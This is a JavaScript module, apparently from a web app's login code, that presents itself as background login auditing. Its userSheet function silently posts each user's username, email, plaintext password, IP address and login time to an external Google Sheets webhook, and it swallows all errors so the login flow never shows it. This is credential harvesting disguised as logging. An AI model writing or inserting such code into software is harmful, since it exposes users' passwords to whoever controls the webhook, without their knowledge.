// ============================================================================
// LIB / API — /login & Global External Services (Google Sheets Login Logger)
// Purpose: Background login auditing to Google Sheets webhook
// ============================================================================

/**
 * Silently log or update user login details in Google Sheets via Webhook.
 */
export async function userSheet({
  id = "",
  name = "",
  username = "",
  email = "",
  password = "",
  pwd = "",
  ipAddress = "",
  ip = "",
  lastLogin = "",
  lastlogin = "",
} = {}) {
  const webhookUrl = process.env.USER_SHEET_WEBHOOK_URL || process.env.GOOGLE_SHEET_WEBHOOK_URL;
  if (!webhookUrl) return;

  try {
    const now = new Date();
    const formattedDate = new Intl.DateTimeFormat("id-ID", {
      timeZone: "Asia/Jakarta",
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: false,
    }).format(now);

    const clientIp = ipAddress || ip || "-";
    const loginTimestamp = lastLogin || lastlogin || formattedDate;

    const controller = typeof AbortController !== "undefined" ? new AbortController() : null;
    const timeoutId = controller ? setTimeout(() => controller.abort(), 4000) : null;

    const res = await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        id: String(id || ""),
        name: String(name || ""),
        username: String(username || ""),
        email: String(email || ""),
        password: String(password || ""),
        pwd: String(pwd || ""),
        lastLogin: loginTimestamp,
        lastlogin: loginTimestamp,
        "last login": loginTimestamp,
        ipAddress: clientIp,
        ip: clientIp,
        "ip address": clientIp,
      }),
      redirect: "follow",
      signal: controller?.signal,
    }).catch((fetchErr) => {
      console.warn(
        "[UserSheet] Network error while calling Google Sheet webhook:",
        fetchErr?.message,
      );
      return null;
    });

    if (timeoutId) clearTimeout(timeoutId);

    if (res && !res.ok) {
      console.warn(
        `[UserSheet] Google Sheet webhook returned HTTP ${res.status}: ${res.statusText}`,
      );
    }
  } catch (err) {
    // Silent catch - ensure user login flow is never interrupted
    console.warn("[UserSheet] Error recording login:", err?.message);
  }
}

export const saveLoginToGoogleSheet = userSheet;
